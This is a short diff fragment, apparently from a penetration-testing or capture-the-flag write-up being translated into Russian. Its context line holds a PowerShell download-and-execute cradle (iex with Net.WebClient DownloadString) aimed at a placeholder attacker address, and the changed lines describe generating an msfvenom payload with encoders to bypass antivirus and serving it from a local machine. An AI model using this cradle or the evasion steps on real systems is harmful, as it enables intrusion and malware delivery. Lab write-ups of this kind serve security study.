@@ -86,9 +86,9 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-po
 
 <img src="https://imgur.com/2LThZZr.png"/>
 
-Generate a msfvenom payload with encoders to by pass AV 
+Сгенерируйте полезную нагрузку msfvenom с кодировщиками для обхода AV.
+Разместите ее на своем локальном компьютере и загрузите, повторив тот же метод:
 
-Host it on your local machine and download it by repeating the same method
 
 <img src="https://imgur.com/2px77nI.png"/>
 
